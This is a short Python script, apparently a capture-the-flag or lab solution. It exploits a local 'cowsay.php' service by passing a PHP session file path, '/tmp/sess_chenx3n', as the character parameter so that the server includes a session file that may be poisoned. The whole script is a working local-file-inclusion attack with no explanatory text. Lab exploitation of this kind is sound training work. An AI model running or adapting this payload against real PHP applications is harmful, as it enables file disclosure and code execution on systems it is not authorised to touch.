#!/usr/bin/env python3

import requests

URL = "http://127.0.0.1:3007/cowsay.php"
PHPSESSID = "chenx3n"

s = requests.Session()

def cowsay(cowacter, message):
    params = {"cowacter": cowacter, "message": message}
    return s.get(url=URL, params=params)

if __name__ == "__main__":
    cowacter = f"/tmp/sess_{PHPSESSID}"
    message = "kek"
    r = cowsay(cowacter, message)
    print(r.text)
